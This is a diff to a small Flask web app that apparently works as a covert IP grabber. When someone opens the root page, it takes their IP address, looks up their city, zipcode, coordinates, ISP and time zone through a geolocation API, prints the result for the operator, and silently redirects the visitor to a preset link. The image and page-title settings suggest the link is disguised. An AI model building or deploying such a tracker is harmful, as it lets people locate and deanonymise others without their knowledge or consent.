@@ -13,18 +13,34 @@ image_url = ''
 link_url = ''
 page_title = ''
 
-# Function to get geolocation
+# Function to get geolocation and format it
 def get_geolocation(ip):
     url = f"https://api.ipgeolocation.io/ipgeo?apiKey={API_KEY}&ip={ip}"
     response = requests.get(url)
-    return response.json()
+    data = response.json()
+    
+    formatted_data = f"""
+    IP: {data.get('ip')}
+    Continent: {data.get('continent_name')}
+    Country: {data.get('country_name')}
+    Country Code: {data.get('country_code2')}
+    State: {data.get('state_prov')}
+    City: {data.get('city')}
+    Zipcode: {data.get('zipcode')}
+    Latitude: {data.get('latitude')}
+    Longitude: {data.get('longitude')}
+    ISP: {data.get('isp')}
+    Organization: {data.get('organization')}
+    Time Zone: {data.get('time_zone', {}).get('name')}
+    Current Time: {data.get('time_zone', {}).get('current_time')}
+    """
+    return formatted_data.strip()
 
 @app.route('/')
 def index():
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     geolocation_data = get_geolocation(user_ip)
-    # Save or process geolocation data as needed
-    print(Fore.GREEN + f"Geolocation for {user_ip}: {geolocation_data}")
+    print(Fore.GREEN + f"Geolocation for {user_ip}:\n{geolocation_data}")
     return redirect(link_url)
 
 @app.route('/image')
